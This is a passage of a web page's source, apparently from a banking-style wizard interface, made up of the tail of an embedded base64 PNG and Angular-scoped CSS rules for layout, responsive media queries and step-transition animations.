b7p2e6HyFOpmzngW93bqAnbtlGru1szWSz72CZ6Fml3vuH8xF6B/gHKiulHOcRZM70w9d3kW07V8dT6TfBss0r9kGV6YFKR91C/dCrOcc9G/D59v+k+0qyU8nIx8nk847jhF13thmTHqscqRHV7M/bwr4St+2TOxubnJ21QRqdjD/c6Lc2W4EAKwUb6RJMBr30cibPAceAAeAUcBz4Z+nebC6hUTJ9o1CGDh1/b/2attYf1NSGKZQNkh+bQtM0yeCFV2ViGaRYxpPAQdXID6iaYy90gzld0oHmcPvWgEE92EWNpdJ3mvHpcLIuSVWhEFkB7GhByGeiKGNBLYZtAVI88avAX4BDS5HQvCM0ayMHhDb5NfRegjKO0z0ei1F9tJ7CNTUUQNh8Pp+EhrAZhjH3u/LAS6qm9S23fzS7LI1Ke4IkFMtwL6nrNelUiiYmYhSJ1FIwGCC/5SeL9/nccigvMRGo9AKOvwXOrNTh5pQ3/5YUM8aQXRSDSg0NURm2QChIedsmE50vEwKRN0DuQWXUioyLbRVeZCXS6YxUKQW1ctkcss3mKp5HPdqDa3ZUksxihA5AgcOOW1Bpamqa0tkMZbPZBCJ1E7Lucc66Zab/sgjxeIIrdzKZpInYJE3Fp5PYQX4R3vnX5OSkPJ/L5eTejQsnh5gV5DF8boTOj45Kb3tL2Ewutrc/CK8MY6K14+Pj1N7WsgfJ3rf/wAEaGxtDXfJRW1sbtbe3wVMG900ytBzqfD4v1Tt67Di1tqyjaDRKFpKiuqrq4puz7TfceLHPE2pXsg1hel039L1Hjw7QqcFBqq2tVX5yZDiZiAslmAyrpUwvwR48MzRE8fgUdhYeRXDvQqEu59ePl3HzHl3XXjt79kOKxScpHA5fj3PVfss6aFkWBQC8lpW8pBzMDK7yfF0mk6ETJ07SuXMfyes6OtbTmroIiq1vSYQOY/J98EFfHGRcx2ZP/AkbgUtDVVXtUCRRzkLL1xQLazqdluf6+/9Dzc2XUFNj44z3yvp9CF/2KCaOcSiymexXQqGqLewXEPu76qc/WFLxMwvTMjkO50fnR2dCWBYhkBnhbGJg3MzZxH5xHeezIHkMhA+A9Zv47BwwpfZiI2phLUu1GbKGYZZDiDhc7AF44QpJCApJUq4bwrEXavWW7Oe5nIwD3ao9Ll+9VCpx0QtYSp48kUjIJ8FTDcI/PTOkcHTUkd8jHMXaxo37LuDnSyLE9aSsCqrSGIS4g7yXd7czKhVJuZ/4ie8+tfq/X3al5nCUg5K68TYm/VmpQrJKq0o9p0eqBu6v5NIx74BffgcSu0Ei4RaVUoTmWSZ4I7hpVQmp3vRpTL4BRH4DnAGEDB0wz78XHqjUWrb4jkGIX4DYr4Bu+OlakNqI/dulWJSjCF9EmXuH+jlmaLUJFQf/KvU2nHMKJJqBFhhpnSITUXWprJb2/wIMAN29zyqmnNkOAAAAAElFTkSuQmCC) center center/contain no-repeat
        }

        .eindhoven[_ngcontent-c30] .eindhoven-content[_ngcontent-c30] .eindhoven-left[_ngcontent-c30] .eindhoven-logo-title[_ngcontent-c30] {
            display: inline-block;
            vertical-align: middle;
            font-size: 14px;
            font-family: dinMedium;
            color: #333;
            padding-top: 4px;
            padding-left: 6px
        }

        .eindhoven[_ngcontent-c30] .eindhoven-content[_ngcontent-c30] .eindhoven-right[_ngcontent-c30] {
            display: table-cell;
            text-align: right;
            padding-top: 18px
        }

        .eindhoven[_ngcontent-c30] .eindhoven-content[_ngcontent-c30] .eindhoven-right[_ngcontent-c30] .eindhoven-description[_ngcontent-c30] {
            color: #333;
            font-size: 14px;
            font-family: dinMedium;
            display: inline-block;
            margin-right: 6px;
            vertical-align: middle
        }

        .eindhoven[_ngcontent-c30] .eindhoven-content[_ngcontent-c30] .eindhoven-right[_ngcontent-c30] .eindhoven-link[_ngcontent-c30] {
            background: #0097c1;
            min-width: 64px;
            height: 35px;
            font-size: 14px;
            padding: 6px 10px 7px;
            border-radius: 0;
            color: #fff;
            display: inline-block;
            vertical-align: middle
        }

        @media only screen and (max-width:374px) and (min-width:320px) {
            .eindhoven[_ngcontent-c30] {
                border-bottom: 1px solid #e1e1e1
            }

            .eindhoven[_ngcontent-c30] .eindhoven-content[_ngcontent-c30] {
                background: #f2f2f2;
                display: table;
                width: 100%;
                table-layout: fixed;
                padding: 7px 10px 8px
            }

            .eindhoven[_ngcontent-c30] .eindhoven-content[_ngcontent-c30] .eindhoven-left[_ngcontent-c30] {
                width: 50%
            }

            .eindhoven[_ngcontent-c30] .eindhoven-content[_ngcontent-c30] .eindhoven-right[_ngcontent-c30] {
                padding-top: 4px
            }

            .eindhoven[_ngcontent-c30] .eindhoven-content[_ngcontent-c30] .eindhoven-right[_ngcontent-c30] .eindhoven-description[_ngcontent-c30] {
                display: block;
                margin-right: 0;
                margin-bottom: 4px
            }
        }
    </style>
<style>
        @charset "UTF-8";

        .ipswich-main[_ngcontent-c31] {
            width: 578px;
            overflow: hidden;
            position: relative;
            min-height: 380px
        }

        .ipswich-main.full-height[_ngcontent-c31] {
            height: 100%;
            min-height: auto
        }

        .ipswich-main.mainWithShadow[_ngcontent-c31] {
            border: 1px solid #e1e1e1;
            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1)
        }

        .ipswich-main.without-advertising[_ngcontent-c31] {
            width: 100%;
            overflow: visible
        }

        .ipswich-main.without-advertising[_ngcontent-c31] .ipswich-main-animate[_ngcontent-c31] .step[_ngcontent-c31] {
            visibility: hidden
        }

        .ipswich-main.without-advertising.full-height[_ngcontent-c31] {
            height: 100%;
            min-height: auto
        }

        .ipswich-main.multiple[_ngcontent-c31] {
            width: 100%
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .ipswich-main[_ngcontent-c31] {
                width: 458px;
                min-height: auto
            }

            .ipswich-main.with-advertising[_ngcontent-c31] {
                overflow: visible
            }

            .ipswich-main-animate[_ngcontent-c31] {
                min-height: auto
            }
        }

        @media only screen and (max-width:767px) and (min-width:640px) {
            .ipswich-main.fl[_ngcontent-c31] {
                float: none !important
            }

            .ipswich-main[_ngcontent-c31] {
                width: 100%
            }

            .ipswich-main.with-advertising[_ngcontent-c31] {
                overflow: visible
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .ipswich-main.wizardAutoHeightMode[_ngcontent-c31] {
                min-height: 0 !important
            }
        }

        @media only screen and (max-width:639px) and (min-width:480px) {
            .ipswich-main.fl[_ngcontent-c31] {
                float: none !important
            }

            .ipswich-main[_ngcontent-c31] {
                width: 100%
            }

            .ipswich-main.with-advertising[_ngcontent-c31] {
                overflow: visible
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .ipswich-main.fl[_ngcontent-c31] {
                float: none !important
            }

            .ipswich-main[_ngcontent-c31] {
                width: 100%;
                min-height: auto
            }

            .ipswich-main-animate[_ngcontent-c31] {
                min-height: auto
            }

            .ipswich-main.with-advertising[_ngcontent-c31] {
                overflow: visible;
                min-height: 310px
            }
        }

        .bots [_nghost-c31] .ipswich-main[_ngcontent-c31] {
            height: 100%
        }

        .bots [_nghost-c31] .ipswich-main[_ngcontent-c31] .ipswich-main-animate[_ngcontent-c31] {
            height: 100%
        }
    </style>
<style>
        .invisible[_ngcontent-c32] {
            visibility: hidden
        }

        .ipswich.wizard[_ngcontent-c32] .ipswich-advertising[_ngcontent-c32] {
            display: none
        }

        .ipswich.wizard[_ngcontent-c32] .ipswich-main[_ngcontent-c32] {
            width: 100%
        }

        .step[_ngcontent-c32] {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            visibility: hidden;
            background: #fff
        }

        .ipswich-main-wizard-header[_ngcontent-c32] {
            padding: 12px 72px 0 28px
        }

        .ipswich-main-back.no-show[_ngcontent-c32] {
            display: none
        }

        .ipswich-main-back[_ngcontent-c32] {
            display: table-cell;
            width: 35px
        }

        .ipswich-main-title-link[_ngcontent-c32] {
            display: table-cell;
            margin-left: -13px;
            padding-right: 10px
        }

        .ipswich-main-title-link[_ngcontent-c32] i[_ngcontent-c32] {
            color: #0097c1;
            font-size: 24px;
            cursor: pointer
        }

        .ipswich-main-title-pipe[_ngcontent-c32] {
            display: table-cell;
            width: 1px;
            border-left: 1px solid #e1e1e1;
            margin: 0 6px 0 9px;
            height: 24px;
            padding-top: 4px;
            vertical-align: top
        }

        .ipswich-main-title[_ngcontent-c32] {
            font-size: 30px;
            color: #12447f;
            margin-bottom: 10px;
            display: table-cell;
            padding-left: 10px
        }

        .ipswich-main-back[_ngcontent-c32]+span.ipswich-main-title[_ngcontent-c32] {
            padding-left: 10px
        }

        .ipswich-main-wizard-pre-header[_ngcontent-c32] {
            padding: 12px 72px 0 28px;
            position: relative
        }

        .ipswich-main-wizard-pre-header.real-header[_ngcontent-c32] {
            height: 42px
        }

        .header-transferMode[_ngcontent-c32] .ipswich-main-wizard-pre-header[_ngcontent-c32] {
            padding: 6px 6px 6px 10px;
            border-bottom: 1px solid #e1e1e1;
            background: #f8f8f8
        }

        .header-transferMode[_ngcontent-c32] .ipswich-main-wizard-pre-header[_ngcontent-c32] .ipswich-main-subtitle-description[_ngcontent-c32] {
            font-size: 16px;
            padding-top: 4px;
            line-height: 20px
        }

        .header-permissionsConfigurationMode[_ngcontent-c32] .ipswich-main-wizard-pre-header[_ngcontent-c32] {
            padding: 6px 6px 6px 10px;
            border-bottom: 1px solid #e1e1e1;
            background: #f8f8f8
        }

        .header-permissionsConfigurationMode[_ngcontent-c32] .ipswich-main-wizard-pre-header[_ngcontent-c32] .ipswich-main-subtitle-description[_ngcontent-c32] {
            font-size: 16px;
            padding-top: 5px;
            line-height: 20px
        }

        .header-transactionAmountsEditMode[_ngcontent-c32] .ipswich-main-wizard-pre-header[_ngcontent-c32] {
            padding: 6px 6px 6px 10px;
            border-bottom: 1px solid #e1e1e1;
            background: #f8f8f8
        }

        .header-transactionAmountsEditMode[_ngcontent-c32] .ipswich-main-wizard-pre-header[_ngcontent-c32] .ipswich-main-subtitle-description[_ngcontent-c32] {
            font-size: 16px;
            padding-top: 4px;
            line-height: 20px
        }

        .ipswich-pre-header-back[_ngcontent-c32] {
            position: relative;
            display: table-cell;
            vertical-align: middle;
            padding-right: 10px
        }

        .ipswich-pre-header-back-title[_ngcontent-c32] {
            font-size: 30px;
            color: #12447f;
            margin-bottom: 30px;
            display: inline-block
        }

        .ipswich-pre-header-back-title-link[_ngcontent-c32] {
            display: table-cell;
            margin-left: 0;
            padding: 5px 10px 0 3px;
            cursor: pointer
        }

        .ipswich-pre-header-back-title-link[_ngcontent-c32] i[_ngcontent-c32] {
            color: #0097c1;
            font-size: 19px;
            display: inline-block
        }

        .ipswich-pre-header-back-title-pipe[_ngcontent-c32] {
            display: table-cell;
            width: 1px;
            border-left: 1px solid #e1e1e1;
            margin: 0 6px 0 9px;
            height: 19px;
            padding-top: 4px;
            vertical-align: top
        }

        .ipswich-main-wizard-pre-header.no-show[_ngcontent-c32],
        .ipswich-pre-header-back.no-show[_ngcontent-c32] {
            display: none
        }

        .ipswich-main-subtitle-step[_ngcontent-c32] {
            font-size: 14px;
            font-family: dinMedium;
            color: #12447f;
            display: inline-block;
            padding: 5px 6px 0 10px;
            vertical-align: top
        }

        .header-transferMode[_ngcontent-c32] .ipswich-main-wizard-pre-header[_ngcontent-c32] .ipswich-pre-header-back[_ngcontent-c32]+.ipswich-main-subtitle-step[_ngcontent-c32] {
            padding-left: 0;
            padding-top: 5px
        }

        .header-transferMode[_ngcontent-c32] .ipswich-main-wizard-pre-header[_ngcontent-c32] .ipswich-main-subtitle-step[_ngcontent-c32]+.ipswich-main-subtitle-description[_ngcontent-c32] {
            font-size: 14px;
            padding-top: 5px
        }

        .ipswich-main-subtitle-description[_ngcontent-c32] {
            font-size: 14px;
            color: #444;
            display: inline-block;
            padding-bottom: 0;
            vertical-align: top;
            padding-top: 5px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        .ipswich-pre-header-title[_ngcontent-c32] {
            font-size: 30px;
            color: #12447f;
            margin-bottom: 30px;
            display: inline-block
        }

        .ipswich-pre-header-title-link[_ngcontent-c32] {
            display: inline-block;
            margin-left: -30px
        }

        .ipswich-pre-header-title-link[_ngcontent-c32] i[_ngcontent-c32] {
            color: #0097c1;
            font-size: 24px
        }

        .ipswich-pre-header-title-pipe[_ngcontent-c32] {
            display: inline-block;
            width: 1px;
            border-left: 1px solid #e1e1e1;
            margin: 0 6px 0 9px;
            height: 24px;
            padding-top: 4px;
            vertical-align: top
        }

        .ipswich-main-footer-description[_ngcontent-c32] {
            font-size: 14px;
            color: #444;
            display: inline-block
        }

        .ipswich-main-required[_ngcontent-c32] {
            height: 10px;
            border-left: 3px solid #0097c1;
            line-height: .4;
            padding-left: 8px;
            position: absolute;
            right: 32px;
            bottom: -10px
        }

        .ipswich-main-required-text[_ngcontent-c32] {
            line-height: 0;
            font-size: 11px
        }

        .ipswich-main-required.no-show[_ngcontent-c32] {
            display: none
        }

        .ipswich-main-wizard-content[_ngcontent-c32] {
            position: relative
        }

        .ipswich-main-buttons-fixed.no-show[_ngcontent-c32] {
            display: none
        }

        .ipswich-main-buttons[_ngcontent-c32] {
            margin-top: 30px;
            text-align: right
        }

        .ipswich-main-additional-buttons.no-show[_ngcontent-c32] {
            display: none
        }

        .ipswich-main-wizard-footer[_ngcontent-c32] {
            height: 42px;
            background: #f8f8f8;
            border: 1px solid #d7d7d7;
            border-left: none;
            border-right: none;
            border-bottom: none;
            padding: 6px 14px 5px
        }

        .ipswich-main-wizard-footer.no-show[_ngcontent-c32] {
            display: none
        }

        .ipswich-main-wizard-footer-message[_ngcontent-c32] {
            position: absolute;
            bottom: 42px;
            left: 0;
            right: 0
        }

        .ipswich-pre-header-back[_ngcontent-c32]:hover .ipswich-pre-header-background[_ngcontent-c32] {
            -webkit-animation: .1s ipswich-pre-header-background-animated;
            animation: .1s ipswich-pre-header-background-animated;
            height: 28px;
            top: 0;
            left: -2px;
            width: 30px;
            background: rgba(0, 0, 0, .05)
        }

        @-webkit-keyframes ipswich-pre-header-background-animated {
            0% {
                width: 7px;
                top: 8px;
                left: 10px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 0;
                left: -2px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes ipswich-pre-header-background-animated {
            0% {
                width: 7px;
                top: 8px;
                left: 10px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 0;
                left: -2px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        .ipswich-pre-header-background[_ngcontent-c32] {
            position: absolute;
            width: 7px;
            height: 16px;
            background: 0 0;
            top: 8px;
            left: 10px;
            -webkit-animation: .1s ipswich-pre-header-background-animated-reverse;
            animation: .1s ipswich-pre-header-background-animated-reverse;
            border-radius: 2px
        }

        @-webkit-keyframes ipswich-pre-header-background-animated-reverse {
            0% {
                width: 30px;
                top: 0;
                left: -2px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 10px;
                height: 16px;
                background: 0 0
            }
        }

        @keyframes ipswich-pre-header-background-animated-reverse {
            0% {
                width: 30px;
                top: 0;
                left: -2px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 10px;
                height: 16px;
                background: 0 0
            }
        }

        .step[_ngcontent-c32] {
            display: none
        }

        .step.fadeOutICB[_ngcontent-c32] {
            visibility: hidden;
            opacity: 0;
            display: none;
            -webkit-animation: .8s step-fadeOutICB;
            animation: .8s step-fadeOutICB
        }

        @-webkit-keyframes step-fadeOutICB {
            0% {
                visibility: visible;
                opacity: 1;
                display: block
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: block
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @keyframes step-fadeOutICB {
            0% {
                visibility: visible;
                opacity: 1;
                display: block
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: block
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @-webkit-keyframes step-fadeInICB {
            0% {
                visibility: hidden;
                opacity: 0;
                display: none
            }

            1% {
                visibility: visible;
                display: block
            }

            100% {
                visibility: visible;
                opacity: 1
            }
        }

        @keyframes step-fadeInICB {
            0% {
                visibility: hidden;
                opacity: 0;
                display: none
            }

            1% {
                visibility: visible;
                display: block
            }

            100% {
                visibility: visible;
                opacity: 1
            }
        }

        .ipswich-step-visible[_ngcontent-c32] {
            visibility: visible;
            display: block
        }

        .step.next-1[_ngcontent-c32] {
            -webkit-transform: translateX(-100%);
            transform: translateX(-100%);
            -webkit-animation: .5s ease-out step-next-1;
            animation: .5s ease-out step-next-1
        }

        @-webkit-keyframes step-next-1 {
            0% {
                -webkit-transform: translateX(0);
                transform: translateX(0)
            }

            100% {
                -webkit-transform: translateX(-100%);
                transform: translateX(-100%)
            }
        }

        @keyframes step-next-1 {
            0% {
                -webkit-transform: translateX(0);
                transform: translateX(0)
            }

            100% {
                -webkit-transform: translateX(-100%);
                transform: translateX(-100%)
            }
        }

        .step.next-2[_ngcontent-c32] {
            -webkit-transform: translateX(-200%);
            transform: translateX(-200%);
            -webkit-animation: .5s ease-out step-next-2;
            animation: .5s ease-out step-next-2
        }

        @-webkit-keyframes step-next-2 {
            0% {
                -webkit-transform: translateX(-100%);
                transform: translateX(-100%)
            }

            100% {
                -webkit-transform: translateX(-200%);
                transform: translateX(-200%)
            }
        }

        @keyframes step-next-2 {
            0% {
                -webkit-transform: translateX(-100%);
                transform: translateX(-100%)
            }

            100% {
                -webkit-transform: translateX(-200%);
                transform: translateX(-200%)
            }
        }

        .step.reverse-1[_ngcontent-c32] {
            -webkit-transform: translateX(0);
            transform: translateX(0);
            -webkit-animation: .5s ease-out step-reverse-1;
            animation: .5s ease-out step-reverse-1
        }

        @-webkit-keyframes step-reverse-1 {
            0% {
                -webkit-transform: translateX(-100%);
                transform: translateX(-100%)
            }

            100% {
                -webkit-transform: translateX(0);
                transform: translateX(0)
            }
        }

        @keyframes step-reverse-1 {
            0% {
                -webkit-transform: translateX(-100%);
                transform: translateX(-100%)
            }

            100% {
                -webkit-transform: translateX(0);
                transform: translateX(0)
            }
        }

        .step.reverse-2[_ngcontent-c32] {
            -webkit-transform: translateX(-100%);
            transform: translateX(-100%);
            -webkit-animation: .5s ease-out step-reverse-2;
            animation: .5s ease-out step-reverse-2
        }

        @-webkit-keyframes step-reverse-2 {
            0% {
                -webkit-transform: translateX(-200%);
                transform: translateX(-200%)
            }

            100% {
                -webkit-transform: translateX(-100%);
                transform: translateX(-100%)
            }
        }

        @keyframes step-reverse-2 {
            0% {
                -webkit-transform: translateX(-200%);
                transform: translateX(-200%)
            }

            100% {
                -webkit-transform: translateX(-100%);
                transform: translateX(-100%)
            }
        }

        .step.next-3[_ngcontent-c32] {
            -webkit-transform: translateX(-300%);
            transform: translateX(-300%);
            -webkit-animation: .5s ease-out step-next-3;
            animation: .5s ease-out step-next-3
        }

        @-webkit-keyframes step-next-3 {
            0% {
                -webkit-transform: translateX(-200%);
                transform: translateX(-200%)
            }

            100% {
                -webkit-transform: translateX(-300%);
                transform: translateX(-300%)
            }
        }

        @keyframes step-next-3 {
            0% {
                -webkit-transform: translateX(-200%);
                transform: translateX(-200%)
            }

            100% {
                -webkit-transform: translateX(-300%);
                transform: translateX(-300%)
            }
        }

        .step.reverse-3[_ngcontent-c32] {
            -webkit-transform: translateX(-200%);
            transform: translateX(-200%);
            -webkit-animation: .5s ease-out step-reverse-3;
            animation: .5s ease-out step-reverse-3
        }

        @-webkit-keyframes step-reverse-3 {
            0% {
                -webkit-transform: translateX(-300%);
                transform: translateX(-300%)
            }

            100% {
                -webkit-transform: translateX(-200%);
                transform: translateX(-200%)
            }
        }

        @keyframes step-reverse-3 {
            0% {
                -webkit-transform: translateX(-300%);
                transform: translateX(-300%)
            }

            100% {
                -webkit-transform: translateX(-200%);
                transform: translateX(-200%)
            }
        }

        .step.next-4[_ngcontent-c32] {
            -webkit-transform: translateX(-400%);
            transform: translateX(-400%);
            -webkit-animation: .5s ease-out step-next-4;
            animation: .5s ease-out step-next-4
        }

        @-webkit-keyframes step-next-4 {
            0% {
                -webkit-transform: translateX(-300%);
                transform: translateX(-300%)
            }

            100% {
                -webkit-transform: translateX(-400%);
                transform: translateX(-400%)
            }
        }

        @keyframes step-next-4 {
            0% {
                -webkit-transform: translateX(-300%);
                transform: translateX(-300%)
            }

            100% {
                -webkit-transform: translateX(-400%);
                transform: translateX(-400%)
            }
        }

        .step.reverse-4[_ngcontent-c32] {
            -webkit-transform: translateX(-300%);
            transform: translateX(-300%);
            -webkit-animation: .5s ease-out step-reverse-4;
            animation: .5s ease-out step-reverse-4
        }

        @-webkit-keyframes step-reverse-4 {
            0% {
                -webkit-transform: translateX(-400%);
                transform: translateX(-400%)
            }

            100% {
                -webkit-transform: translateX(-300%);
                transform: translateX(-300%)
            }
        }

        @keyframes step-reverse-4 {
            0% {
                -webkit-transform: translateX(-400%);
                transform: translateX(-400%)
            }

            100% {
                -webkit-transform: translateX(-300%);
                transform: translateX(-300%)
            }
        }

        .step.next-5[_ngcontent-c32] {
            -webkit-transform: translateX(-500%);
            transform: translateX(-500%);
            -webkit-animation: .5s ease-out step-next-5;
            animation: .5s ease-out step-next-5
        }

        @-webkit-keyframes step-next-5 {
            0% {
                -webkit-transform: translateX(-400%);
                transform: translateX(-400%)
            }

            100% {
                -webkit-transform: translateX(-500%);
                transform: translateX(-500%)
            }
        }

        @keyframes step-next-5 {
            0% {
                -webkit-transform: translateX(-400%);
                transform: translateX(-400%)
            }

            100% {
                -webkit-transform: translateX(-500%);
                transform: translateX(-500%)
            }
        }

        .step.reverse-5[_ngcontent-c32] {
            -webkit-transform: translateX(-400%);
            transform: translateX(-400%);
            -webkit-animation: .5s ease-out step-reverse-5;
            animation: .5s ease-out step-reverse-5
        }

        @-webkit-keyframes step-reverse-5 {
            0% {
                -webkit-transform: translateX(-500%);
                transform: translateX(-500%)
            }

            100% {
                -webkit-transform: translateX(-400%);
                transform: translateX(-400%)
            }
        }

        @keyframes step-reverse-5 {
            0% {
                -webkit-transform: translateX(-500%);
                transform: translateX(-500%)
            }

            100% {
                -webkit-transform: translateX(-400%);
                transform: translateX(-400%)
            }
        }

        .ipswich-main-wizard-header[_ngcontent-c32] {
            width: 100%;
            display: block
        }

        .ipswich-main-wizard-pre-header[_ngcontent-c32] {
            width: 100%;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex
        }

        .ipswich-main-wizard-content[_ngcontent-c32] {
            display: table;
            width: 100%;
            height: calc(100% - 42px);
            overflow: auto;
            background-color: #fff
        }

        .ipswich-main-wizard-pre-header[_ngcontent-c32]+.ipswich-main-wizard-content[_ngcontent-c32] {
            height: calc(100% - 84px)
        }

        .ipswich-main-wizard-footer[_ngcontent-c32] {
            display: table;
            width: 100%
        }

        .full-height[_ngcontent-c32] .ipswich-main-wizard-content[_ngcontent-c32],
        .full-height[_ngcontent-c32] .ipswich-main-wizard-footer[_ngcontent-c32] {
            display: block
        }

        .full-height.step[_ngcontent-c32] {
            bottom: 0
        }

        .ipswich-main-title-link[_ngcontent-c32] {
            position: relative;
            cursor: pointer
        }

        .ipswich-main-title-link[_ngcontent-c32]:hover .ipswich-header-background[_ngcontent-c32] {
            -webkit-animation: .1s ipswich-header-background-animated;
            animation: .1s ipswich-header-background-animated;
            height: 28px;
            top: -3px;
            left: -3px;
            width: 30px;
            background: rgba(0, 0, 0, .05)
        }

        @-webkit-keyframes ipswich-header-background-animated {
            0% {
                width: 7px;
                top: 4px;
                left: 9px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: -3px;
                left: -3px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes ipswich-header-background-animated {
            0% {
                width: 7px;
                top: 4px;
                left: 9px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: -3px;
                left: -3px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        .ipswich-header-background[_ngcontent-c32] {
            position: absolute;
            width: 7px;
            height: 16px;
            background: 0 0;
            top: 4px;
            left: 9px;
            -webkit-animation: .1s ipswich-header-background-animated-reverse;
            animation: .1s ipswich-header-background-animated-reverse;
            border-radius: 2px
        }

        @-webkit-keyframes ipswich-header-background-animated-reverse {
            0% {
                width: 30px;
                top: -3px;
                left: -3px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 4px;
                left: 9px;
                height: 16px;
                background: 0 0
            }
        }

        @keyframes ipswich-header-background-animated-reverse {
            0% {
                width: 30px;
                top: -3px;
                left: -3px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 4px;
                left: 9px;
                height: 16px;
                background: 0 0
            }
        }

        @media only screen and (min-width:768px) {
            .step[_ngcontent-c32] {
                background: #fff;
                position: relative;
                top: 0;
                left: 0
            }

            .step.full-height[_ngcontent-c32] {
                position: absolute
            }
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .ipswich-advertising[_ngcontent-c32] img[_ngcontent-c32] {
                width: 100%
            }

            .scrollContent[_ngcontent-c32] {
                height: 295px;
                overflow-y: auto
            }

            .ipswich-main-wizard-header[_ngcontent-c32] {
                padding-right: 42px;
                padding-top: 6px
            }

            .ipswich-main-wizard-pre-header[_ngcontent-c32] {
                padding-right: 42px
            }

            .ipswich-advertising[_ngcontent-c32] {
                width: 280px;
                height: 298px;
                overflow: hidden
            }

            .step.header-changePasswordMode[_ngcontent-c32] .ipswich-main-title[_ngcontent-c32] {
                font-size: 24px
            }
        }

        @media only screen and (max-width:767px) and (min-width:640px) {
            .ipswich-advertising[_ngcontent-c32] {
                width: 100%;
                height: auto;
                overflow: hidden;
                float: none;
                margin: auto
            }

            .ipswich-advertising.fr[_ngcontent-c32] {
                float: none !important;
                text-align: center
            }

            .step[_ngcontent-c32] {
                position: absolute;
                top: 0;
                left: 0
            }

            .ipswich-main-title[_ngcontent-c32] {
                font-size: 20px;
                vertical-align: top
            }

            .ipswich-main-subtitle-step[_ngcontent-c32] {
                font-size: 12px
            }

            .ipswich-pre-header-back-title-link[_ngcontent-c32] {
                padding: 5px 10px 0 0
            }

            .ipswich-main-subtitle-description[_ngcontent-c32] {
                font-size: 12px;
                font-family: dinRegular
            }

            .ipswich-main-title-link[_ngcontent-c32] {
                vertical-align: top;
                padding-top: 4px
            }

            .ipswich-main-title-link[_ngcontent-c32] i[_ngcontent-c32] {
                font-size: 20px;
                font-family: dinMedium
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .ipswich-main-wizard-footer.withBorders[_ngcontent-c32] {
                border-bottom: 1px solid #d7d7d7
            }

            .header-permissionsConfigurationMode[_ngcontent-c32] .ipswich-main-wizard-pre-header[_ngcontent-c32] {
                padding-top: 30px;
                height: 70px
            }

            .header-permissionsConfigurationMode[_ngcontent-c32] .ipswich-main-wizard-pre-header[_ngcontent-c32] .ipswich-main-subtitle-description[_ngcontent-c32] {
                padding-top: 4px
            }

            .header-permissionsConfigurationMode[_ngcontent-c32] .ipswich-main-wizard-content[_ngcontent-c32] {
                height: calc(100% - 112px)
            }

            .step.wizardAutoHeightMode[_ngcontent-c32] {
                position: relative;
                float: none;
                height: auto
            }

            .step.wizardAutoHeightMode[_ngcontent-c32] .ipswich-main-wizard-footer[_ngcontent-c32] {
                margin-bottom: 20px
            }
        }

        @media only screen and (max-width:639px) and (min-width:480px) {
            .ipswich-advertising[_ngcontent-c32] {
                width: 100%;
                height: auto;
                overflow: hidden;
                float: none;
                margin: auto
            }

            .ipswich-advertising.fr[_ngcontent-c32] {
                float: none !important;
                text-align: center
            }

            .scrollContent[_ngcontent-c32] {
                height: 370px;
                overflow-y: auto
            }

            .ipswich-main-title[_ngcontent-c32] {
                font-size: 20px;
                vertical-align: top
            }

            .ipswich-pre-header-back-title-link[_ngcontent-c32] {
                padding: 5px 10px 0 0
            }

            .ipswich-main-subtitle-description[_ngcontent-c32] {
                font-size: 12px;
                font-family: dinRegular
            }

            .ipswich-main-subtitle-step[_ngcontent-c32] {
                white-space: nowrap;
                font-size: 12px
            }

            .ipswich-main-title-link[_ngcontent-c32] {
                vertical-align: top;
                padding-top: 4px
            }

            .ipswich-main-title-link[_ngcontent-c32] i[_ngcontent-c32] {
                font-size: 20px;
                font-family: dinMedium
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .ipswich-advertising[_ngcontent-c32] {
                width: 100%;
                height: auto;
                overflow: hidden
            }

            .ipswich-advertising.fr[_ngcontent-c32] {
                float: none !important;
                text-align: center
            }

            .scrollContent[_ngcontent-c32] {
                height: 300px;
                overflow-y: auto
            }

            .ipswich-main-title[_ngcontent-c32] {
                font-size: 18px;
                vertical-align: top;
                padding-top: 1px
            }

            .ipswich-main-wizard-header[_ngcontent-c32],
            .ipswich-main-wizard-pre-header[_ngcontent-c32] {
                padding-right: 20px;
                padding-left: 20px
            }

            .ipswich-pre-header-back-title-link[_ngcontent-c32] {
                padding: 5px 10px 0 0
            }

            .ipswich-main-subtitle-description[_ngcontent-c32] {
                font-size: 12px;
                font-family: dinRegular
            }

            .ipswich-main-subtitle-step[_ngcontent-c32] {
                white-space: nowrap;
                font-size: 12px
            }

            .ipswich-main-title-link[_ngcontent-c32] {
                margin-left: 0;
                vertical-align: top;
                padding-top: 4px
            }

            .ipswich-main-title-link[_ngcontent-c32] i[_ngcontent-c32] {
                font-size: 20px;
                font-family: dinMedium
            }

            .ipswich-main-title-pipe[_ngcontent-c32] {
                height: 16px;
                margin: 0 4px 0 5px
            }

            .ipswich-advertising[_ngcontent-c32] {
                float: none;
                margin: auto
